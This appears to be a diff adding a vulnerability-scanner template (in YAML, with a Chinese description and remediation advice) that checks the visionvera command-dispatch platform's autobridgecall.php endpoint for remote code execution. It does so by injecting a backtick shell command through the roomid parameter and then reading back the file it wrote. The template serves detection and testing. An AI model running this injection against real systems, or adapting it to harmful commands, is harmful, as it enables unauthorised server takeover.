@@ -1,0 +1,45 @@
+id: visionvera-zhihuidiaodu-autobridgecall-php-rce
+
+info:
+  name: visionvera zhihuidiaodu autobridgecall.php 代码执行
+  author: bl
+  severity: critical
+  tags: 指挥调度管理平台
+  description: |-
+    本模板用于检测 visionvera zhihuidiaodu 组件中 autobridgecall.php 接口存在的代码执行漏洞。攻击者可利用该接口在目标服务器上执行任意命令，进而可能导致服务器被完全控制。实际影响取决于目标系统的版本、部署配置及网络暴露范围。
+  remediation: >-
+    升级到包含漏洞修复的最新厂商支持版本。在完成升级前，限制对受影响端点的访问，尽可能禁用存在风险的功能，落实最小权限原则，并监控可疑的进程执行行为。
+  
+variables:
+  filename: '{{to_lower(rand_base(8))}}'
+  s1: '{{to_lower(rand_base(8))}}'
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/api/client/autobridgecall.php?roomid=%60echo%20{{s1}}%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fapi%2Fclient%2Faudiobroadcast%2F{{filename}}.txt%60'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: word
+        words:
+          - "\"returncode\":\"0\""
+        part: body
+        internal: true
+  - method: GET
+    path:
+      - '{{BaseURL}}/api/client/audiobroadcast/{{filename}}.txt'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{s1}}"
+        part: body
